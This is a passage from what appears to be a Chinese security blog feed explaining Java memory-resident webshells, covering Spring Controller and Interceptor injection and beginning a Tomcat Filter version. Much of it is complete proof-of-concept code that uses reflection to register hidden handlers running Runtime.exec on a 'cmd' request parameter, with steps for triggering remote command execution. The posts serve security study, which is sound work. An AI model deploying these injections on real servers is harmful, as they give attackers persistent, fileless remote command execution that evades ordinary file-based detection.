filed = Class.forName(\u0026#34;org.springframework.context.support.LiveBeansView\u0026#34;).getDeclaredField(\u0026#34;applicationContexts\u0026#34;); // 2. 属性被 private 修饰，所以 setAccessible true filed.setAccessible(true); // 3. 获取一个 ApplicationContext 实例 org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next(); org.springframework.context.support.LiveBeansView 类在 spring-context 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 ApplicationContext 的实例。\n1.3.2 注册 Controller Spring Controller 的动态注册，就是对 RequestMappingHandlerMapping 注入的过程。\nSpring 2.5 开始到 Spring 3.1 之前一般使用 org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping 映射器 ；\nSpring 3.1 开始及以后一般开始使用新的 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping映射器来支持@Contoller和@RequestMapping注解。\n三种方法：\nregisterMapping registerHandler detectHandlerMethods registerMapping 在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping\njava\r1 2 3 4 5 6 7 8 9 10 11 // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. 通过反射获得自定义 controller 中唯一的 Method 对象 Method method = (Class.forName(\u0026#34;me.landgrey.SSOLogin\u0026#34;).getDeclaredMethods())[0]; // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\u0026#34;/hahaha\u0026#34;); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\u0026#34;恶意Controller\u0026#34;).newInstance(), method); registerHandler 参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping\n在其registerHandler()方法中\n该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中\njava\r1 2 3 4 5 6 7 8 9 // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean context.getBeanFactory().registerSingleton(\u0026#34;dynamicController\u0026#34;, Class.forName(\u0026#34;me.landgrey.SSOLogin\u0026#34;).newInstance()); // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. 反射获得 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\u0026#34;registerHandler\u0026#34;, String.class, Object.class); m1.setAccessible(true); // 4. 将 dynamicController 和 URL 注册到 handlerMap 中 m1.invoke(dh, \u0026#34;/favicon\u0026#34;, \u0026#34;dynamicController\u0026#34;); detectHandlerMethods 该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean\njava\r1 2 3 4 5 context.getBeanFactory().registerSingleton(\u0026#34;dynamicController\u0026#34;, Class.forName(\u0026#34;恶意Controller\u0026#34;).newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\u0026#34;detectHandlerMethods\u0026#34;, Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, \u0026#34;dynamicController\u0026#34;); 1.3.3 实现恶意 Controller java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.src.springmem.demos.web; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import javax.servlet.http.HttpServletRequest; import java.io.IOException; public class ControllerShell { public ControllerShell() {} public void shell() throws IOException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;)); } } 1.3.4 完整 POC POC 并不唯一，想要复现成功取决于自己的运行环境，比如 spring boot 版本问题等，具体问题具体分析！\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.src.springmem.demos.web; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import java.io.IOException; import java.lang.reflect.Method; @Controller public class shell_controller { // @ResponseBody @RequestMapping(\u0026#34;/control\u0026#34;) public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException { //获取当前上下文环境 WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); //手动注册Controller // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. 通过反射获得自定义 controller 中唯一的 Method 对象 Method method = Controller_Shell.class.getDeclaredMethod(\u0026#34;shell\u0026#34;); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\u0026#34;/shell\u0026#34;); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, new Controller_Shell(), method); } public class Controller_Shell{ public Controller_Shell(){} public void shell() throws IOException { //获取request HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;)); } } } 先访问 /control 进行 controller 注册，然后访问 controller 映射路径 /shell，加上参数就可以实现 RCE\n记录问题： 环境：\nSpring Boot v2.6.13\nSpring Framework v5.3.23\nTomcat 9.0.68\nJDK 1.8.0_65\n- 核心错误：（借用 AI 解决）\njava.lang.IllegalArgumentException: Expected lookupPath in request attribute \u0026ldquo;org.springframework.web.util.UrlPathHelper.PATH\u0026rdquo;.\n​\tat org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.3.23.jar:5.3.23]\n​\tat org.springframework.web.util.UrlPathHelper.getResolvedLookupPath(UrlPathHelper.java:213) ~[spring-web-5.3.23.jar:5.3.23]\nSpring MVC 在匹配请求路径时，从 request 中没有找到名为 \u0026quot;org.springframework.web.util.UrlPathHelper.PATH\u0026quot; 的属性。\n这是 Spring 5.3.x 与 Tomcat 9 / Servlet 4 之间在请求路径解析机制上的一个兼容性问题。\n出现原因：\nSpring Boot 版本问题 使用的是：\nSpring Boot 2.6.13\nSpring Framework 5.3.23\nTomcat 9.0.68\n这一代中，Spring MVC 的路径解析默认切换到了 PathPatternParser，而部分组件仍然依赖旧的 UrlPathHelper。\n如果你项目中混用了旧式的 @RequestMappingHandlerMapping 或自定义 HandlerMapping，也可能触发这个问题。\nSpring 配置不兼容（可能加了某些配置类） 从 Spring Boot 2.6 开始：\n默认路径匹配策略从 AntPathMatcher 改成了 PathPatternParser； 某些旧代码（或自定义 Controller 注册逻辑）没适配这个新规则。 解决方法：\n在 application.properties 或 application.yml 加上：\nplain\r1 spring.mvc.pathmatch.matching-strategy=ant_path_matcher 意思：强制使用旧版的路径解析机制（与 Spring 2.5 以前版本兼容）。\n适用于目前使用的 Spring Boot 2.6.x。\n2、Interceptor 内存马 什么是Interceptor Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。\n在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。\n通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义 通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义 Interceptor和Tomcat和Filter过滤器很类似。\n区别如下：\nInterceptor基于反射，Filter基于函数回调 Interceptor不依赖servlet容器 Interceptor只能对action请求有用 Interceptor可以访问action上下文，栈里的对象。Filter不能 action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次 Interceptor可以获取IOC容器中的bean，Filter不行 由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作\n2.1 Interceptor 创建 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package com.src.springmem.demos.interceptor; import org.springframework.web.servlet.HandlerInterceptor; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.PrintWriter; public class LoginInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String url = String.valueOf(request.getRequestURL()); PrintWriter writer = response.getWriter(); if(url.indexOf(\u0026#34;/login\u0026#34;)\u0026gt;= 0 ){ writer.write(\u0026#34;LoginIn\u0026#34;); writer.flush(); writer.close(); return true; } writer.write(\u0026#34;LoginInFirst\u0026#34;); writer.flush(); writer.close(); return false; } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.src.springmem.demos.controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class LoginController { @GetMapping(\u0026#34;/login\u0026#34;) public String login() { return \u0026#34;Login Page\u0026#34;; } @GetMapping(\u0026#34;/data\u0026#34;) public String data() { return \u0026#34;Protected Data\u0026#34;; } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.src.springmem.demos.config; import com.src.springmem.demos.interceptor.LoginInterceptor; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; @Configuration public class WebConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new LoginInterceptor()) .addPathPatterns(\u0026#34;/**\u0026#34;) // 拦截所有路径 .excludePathPatterns(\u0026#34;/login\u0026#34;); // 放行登录接口 } } 访问可通行的路径：\n2.2 Interceptor 流程分析 还是在 DispatcherServlet.doDispatch 处下断点调试\n步入 getHandler()\n继续跟进，来到一个方法：getHandlerExecutionChain\n该方法从 adaptedInterceptors 中把符合的拦截器添加到 chain 里，\n最后把结果返回到 doDispatch\n在 doDispath 中执行 applyPreHandle 遍历执行了拦截器。\n其他师傅给出了 Filter,controller,Interceptors执行的顺序：\npreHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。 postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。 afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。 2.3 注册 Interceptor 2.3.1 获取上下文 参考 Controller 的获取上下文方式\n这里使用反射获取\njava\r1 2 3 4 5 6 // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性 java.lang.reflect.Field filed = Class.forName(\u0026#34;org.springframework.context.support.LiveBeansView\u0026#34;).getDeclaredField(\u0026#34;applicationContexts\u0026#34;); // 2. 属性被 private 修饰，所以 setAccessible true filed.setAccessible(true); // 3. 获取一个 ApplicationContext 实例 org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next(); 2.3.2 获取adaptedInterceptors属性值 获得 ApplicationContext 实例后，还需要知道 org.springframework.web.servlet.handler.AbstractHandlerMapping 类实例的 bean name 叫什么。\n我们可以通过ApplicationContext上下文来获取AbstractHandlerMapping，进而反射获取adaptedInterceptors属性值\njava\r1 2 3 4 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\u0026#34;requestMappingHandlerMapping\u0026#34;); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\u0026#34;adaptedInterceptors\u0026#34;); field.setAccessible(true); java.util.ArrayList\u0026lt;Object\u0026gt; adaptedInterceptors = (java.util.ArrayList\u0026lt;Object\u0026gt;)field.get(abstractHandlerMapping); 2.3.3 恶意 Interceptor java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package com.shell.interceptor; import org.springframework.web.servlet.HandlerInterceptor; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class ShellInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if (cmd != null) { try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } catch (NullPointerException n) { n.printStackTrace(); } return true; } return false; } } 2.3.4 动态注册Interceptor 我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 adaptedInterceptors 属性值中就可以了。\njava\r1 2 3 //将恶意Interceptor添加入adaptedInterceptors ShellInterceptor shell_interceptor = new ShellInterceptor(); adaptedInterceptors.add(shell_interceptor); 2.3.5 完整 POC java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package com.src.springmem.demos.controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.servlet.HandlerInterceptor; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @Controller public class shell_interceptor_controller { @ResponseBody @RequestMapping(\u0026#34;/inject\u0026#34;) public void Inject() throws Exception { //获取上下文环境 java.lang.reflect.Field filed = Class.forName(\u0026#34;org.springframework.context.support.LiveBeansView\u0026#34;).getDeclaredField(\u0026#34;applicationContexts\u0026#34;); filed.setAccessible(true); org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(null)).iterator().next(); //获取adaptedInterceptors属性值 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\u0026#34;requestMappingHandlerMapping\u0026#34;); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\u0026#34;adaptedInterceptors\u0026#34;); field.setAccessible(true); java.util.ArrayList\u0026lt;Object\u0026gt; adaptedInterceptors = (java.util.ArrayList\u0026lt;Object\u0026gt;) field.get(abstractHandlerMapping); //将恶意 Interceptor添加入 adaptedInterceptors ShellInterceptor shellInterceptor = new ShellInterceptor(); adaptedInterceptors.add(shellInterceptor); } public class ShellInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if (cmd != null) { try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } catch (NullPointerException n) { n.printStackTrace(); } return true; } return false; } } } 参考： 【原创】利用“进程注入”实现无文件不死webshell\nJava安全学习——内存马 - 枫のBlog\nSpring内存马 | CurlySean’s Blog\nJava Agent实现反序列化注入内存shell\nJavaWeb 内存马一周目通关攻略 | 素十八\nJavaWeb 内存马二周目通关攻略 | 素十八\nShell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com\nJava内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户\nJava 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客\nSpring型内存马分析\nServlet 简介 | 菜鸟教程\nSpring内存马学习\nSpring内存马——Controller/Interceptor构造\n[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)\nJava安全学习——ROME反序列化 - 枫のBlog （使用Javassist缩短恶意class）\nJava Agent实现反序列化注入内存shell\nAgent内存马 | CurlySean’s Blog\n","permalink":"http://localhost:1313/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87---spring-%E5%86%85%E5%AD%98%E9%A9%AC/","summary":"\u003ch1 id=\"java-内存马第三篇---spring-内存马\"\u003eJava 内存马第三篇 - Spring 内存马\u003c/h1\u003e\n\u003ch1 id=\"三spring-内存马\"\u003e三、Spring 内存马\u003c/h1\u003e\n\u003ch2 id=\"1controller-内存马\"\u003e1、Controller 内存马\u003c/h2\u003e\n\u003ch3 id=\"一些基础知识\"\u003e一些基础知识：\u003c/h3\u003e\n\u003ch4 id=\"bean\"\u003eBean\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eBean\u003c/code\u003e 是 Spring 框架的一个\u003cstrong\u003e核心概念\u003c/strong\u003e，它是构成应用程序的主干，并且是由 \u003ccode\u003eSpring IoC\u003c/code\u003e 容器负责实例化、配置、组装和管理的对象。\u003c/p\u003e","title":"Java 内存马第三篇 - Spring 内存马"},{"content":"Java 内存马第二篇 - Tomcat 内存马 二、Tomcat 内存马 1. Filter 内存马 Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。\n通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：\n使用 ServletContext 的 addFilter/createFilter 方法注册； 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）； 使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。 1.1 环境创建 web.xml:\nxml\r1 2 3 4 5 6 7 8 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.src.tomcatdemo.FilterTest\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/filter\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 自定义一个 Filter:\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package com.src.tomcatdemo; import javax.servlet.*; import java.io.IOException; public class FilterTest implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Filter launch\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(\u0026#34;The filtering operation was performed\\n\u0026#34;); filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() {} } 1.2 流程分析 在访问 /filter 之后的流程分析 text\r1 filterChain.doFilter(servletRequest, servletResponse); 断点调试\nApplicationFilterChain.dofilter\n安全检查：如果启用了安全管理器(Globals.IS_SECURITY_ENABLED)，则在特权上下文中执行\n执行：实际过滤逻辑在internalDoFilter方法中完成\n此时的 filter 中有俩个值：\n0 是我们自定义的 FilterTest\n1 是 tomcat 自带的\n调用了filter.doFilter()，而filter是通过filterConfig.getFilter()得到的，filterConfig定义如下\n总的来说： 最后一个 filter 调用 servlet 的 service 方法\n上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；\n最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。\n只要 Filter 链中任意一个 Filter 没有调用 FilterChain.doFilter() 方法，则目标 Servlet.service() 方法都不会被执行。\n在访问 /filter 之前的流程分析 filter是如何被创建并注册的\n之前的流程：\n进入 StandardWrapperValve.invoke\n这个函数中有 creatFilterChain\n一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的filters属性是一个ApplicationFilterConfig数组。我们来寻找一下ApplicationFilterChain.filters属性在哪里被赋值。\n在StandardWrapperValve#invoke()方法中，通过ApplicationFilterFactory.createFilterChain()方法初始化了一个ApplicationFilterChain类\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 public final class ApplicationFilterFactory { ... public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) { // If there is no servlet to execute, return null if (servlet == null) { return null; } // Create and initialize a filter chain object ApplicationFilterChain filterChain; if (request instanceof Request) { Request req = (Request) request; if (Globals.IS_SECURITY_ENABLED) { // Security: Do not recycle filterChain = new ApplicationFilterChain(); } else { filterChain = (ApplicationFilterChain) req.getFilterChain(); if (filterChain == null) { filterChain = new ApplicationFilterChain(); req.setFilterChain(filterChain); } } } else { // Request dispatcher in use filterChain = new ApplicationFilterChain(); } // 创建 filterChain filterChain.setServlet(servlet); filterChain.setServletSupportsAsync(wrapper.isAsyncSupported()); // Acquire the filter mappings for this Context //wrapper.getParent() 获取 StandardContext 对象 StandardContext context = (StandardContext) wrapper.getParent(); //获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息 FilterMap filterMaps[] = context.findFilterMaps(); // If there are no filter mappings, we are done if (filterMaps == null || filterMaps.length == 0) { return filterChain; } // Acquire the information we will need to match filter mappings DispatcherType dispatcher = (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR); String requestPath = FilterUtil.getRequestPath(request); String servletName = wrapper.getName(); // Add the relevant path-mapped filters to this filter chain for (FilterMap filterMap : filterMaps) { if (!matchDispatcher(filterMap, dispatcher)) { continue; } if (!FilterUtil.matchFiltersURL(filterMap, requestPath)) { continue; } //在StandardContext中获取FilterConfig ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); if (filterConfig == null) { log.warn(sm.getString(\u0026#34;applicationFilterFactory.noFilterConfig\u0026#34;, filterMap.getFilterName())); continue; } //将一个filterConfig添加到filterChain中 filterChain.addFilter(filterConfig); } // Add filters that match on servlet name second for (FilterMap filterMap : filterMaps) { if (!matchDispatcher(filterMap, dispatcher)) { continue; } if (!matchFiltersServlet(filterMap, servletName)) { continue; } ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); if (filterConfig == null) { log.warn(sm.getString(\u0026#34;applicationFilterFactory.noFilterConfig\u0026#34;, filterMap.getFilterName())); continue; } filterChain.addFilter(filterConfig); } // Return the completed filter chain return filterChain; } } 小结：filterChain对象的创建过程 首先通过filterChain = new ApplicationFilterChain()创建一个空的 filterChain 对象 然后通过wrapper.getParent()函数来获取StandardContext对象 接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息 最后根据Filter的名称，在StandardContext中获取FilterConfig 通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中 跟进到 createFilterChain 函数中，我们能看到此时的上下文对象StandardContext实际上是包含了filterConfigs、filterDefs、filterMaps\nfilterConfigs:包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理\n其中filterConfigs包含了当前的上下文信息StandardContext、以及filterDef等信息\nfilterDef\ntext\r1 filterDef`必要的属性为`filter`、`filterClass`以及`filterName filterDef 就是对应 web.xml 中的 filter 标签\nxml\r1 2 3 4 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;filter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;filter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; filterDefs:包含所有过滤器包括实例内部等变量\ntext\r1 filterDefs`是一个HashMap，以键值对的形式存储`filterDef filterMaps:包含所有过滤器的URL映射关系\nfilterMaps中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的\u0026lt;filter-mapping\u0026gt;标签\nfilterMaps必要的属性为dispatcherMapping、filterName、urlPatterns\n1.3 攻击思路： 只需要构造含有恶意的 filter 的 filterConfig 和拦截器 filterMaps，就可以触发，而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签\nxml\r1 2 3 4 5 6 7 8 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.src.tomcatdemo.FilterTest\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/filter\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 那么只要可以更改web.xml 的filter-mapping 标签，就可以攻击成功了\n找到 FilterMaps 通过下面的俩个方法进行添加数据\n其中的 filterConfig 可以通过 filterConfigs.put(name, filterConfig); 添加\n动态添加恶意Filter的思路\n获取StandardContext对象 这一步和 servlet 的获取 StandardContext 对象一致：\njava\r1 2 3 4 5 6 7 8 9 ServletContext servletContext = request.getServletContext(); Field applicationContextFiled = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); applicationContextFiled.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextFiled.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); standardContextField.setAccessible(true); StandardContext context = (StandardContext) standardContextField.get(applicationContext); 创建恶意Filter java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.src.tomcatdemo; import javax.servlet.*; import java.io.IOException; public class ShellFilter implements Filter { @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); try { Runtime.getRuntime().exec(\u0026#34;cmd\u0026#34;); } catch (IOException e){ e.printStackTrace(); } catch (NullPointerException n){ n.printStackTrace(); } } } 使用FilterDef对Filter进行封装，并添加必要的属性 java\r1 2 3 4 5 6 String name = \u0026#34;CommonFilter\u0026#34;; FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); context.addFilterDef(filterDef); 创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中 java\r1 2 3 4 5 FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); context.addFilterMapBefore(filterMap); 使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中 java\r1 2 3 4 5 6 7 8 Field Configs = standardContextField.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(context); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context, filterDef); filterConfigs.put(name, filterConfig); 完整 POC：addFilter.jsp （一定要注意包不能导错！）\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;%@ page 